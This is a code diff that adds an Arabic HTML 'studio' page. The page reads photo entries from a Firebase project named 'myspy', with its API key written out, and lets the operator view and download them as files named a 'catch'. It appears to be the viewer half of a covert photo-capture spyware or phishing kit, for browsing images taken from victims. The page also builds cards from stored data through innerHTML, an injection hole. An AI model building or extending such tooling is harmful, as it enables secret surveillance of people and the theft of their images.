@@ -1,14 +1,48 @@
-function saveToGallery(base64) {
-    // كود تحويل الصورة لملف حقيقي للتحميل في المعرض
-    const byteString = atob(base64.split(',')[1]);
-    const mimeString = base64.split(',')[0].split(':')[1].split(';')[0];
-    const ab = new ArrayBuffer(byteString.length);
-    const ia = new Uint8Array(ab);
-    for (let i = 0; i < byteString.length; i++) { ia[i] = byteString.charCodeAt(i); }
-    const blob = new Blob([ab], {type: mimeString});
-    
-    const link = document.createElement('a');
-    link.href = URL.createObjectURL(blob);
-    link.download = `صيدة_المشاكس_${Date.now()}.jpg`;
-    link.click();
-}
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>استوديو آلَﻤــشّـآ كَسًـ آلَۼد</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <style>
+        body { background: #000; color: #fff; text-align: center; direction: rtl; font-family: sans-serif; }
+        .gallery { display: flex; flex-wrap: wrap; justify-content: center; gap: 20px; padding: 20px; }
+        .card { border: 2px solid #f00; border-radius: 15px; background: #111; padding: 15px; width: 280px; box-shadow: 0 0 15px rgba(255,0,0,0.3); }
+        img { width: 100%; border-radius: 10px; cursor: pointer; }
+        .dl-btn { background: #f00; color: #fff; border: none; padding: 12px; border-radius: 10px; width: 100%; margin-top: 10px; font-weight: bold; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <h1 style="color: #f00; text-shadow: 0 0 15px red;">🔥 استوديو آلَﻤــشّـآ كَسًـ آلَۼد 🔥</h1>
+    <div class="gallery" id="list"></div>
+    <script>
+        const firebaseConfig = { apiKey: "AIzaSyAvb-rjNbcWHlZEdEF0q9v3PL8XF8jnt3U", authDomain: "myspy-2579b.firebaseapp.com", projectId: "myspy-2579b", storageBucket: "myspy-2579b.firebasestorage.app", messagingSenderId: "487846863334", appId: "1:487846863334:web:b58620e6f34d187e02b627" };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+        const myId = localStorage.getItem('userId');
+
+        db.ref('results/' + myId).on('child_added', (snap) => {
+            const d = snap.val();
+            const card = document.createElement('div');
+            card.className = 'card';
+            card.innerHTML = `
+                <img src="${d.photo}" onclick="window.open(this.src)">
+                <p style="font-size:12px;">${d.date}</p>
+                <button class="dl-btn" onclick="downloadImg('${d.photo}')">حفظ في المعرض 📥</button>
+            `;
+            document.getElementById('list').prepend(card);
+        });
+
+        function downloadImg(base64) {
+            const link = document.createElement('a');
+            link.href = base64;
+            link.download = `صيدة_المشاكس_${Date.now()}.jpg`;
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+            alert("تم الحفظ في المعرض بنجاح! 🔥");
+        }
+    </script>
+</body>
+</html>
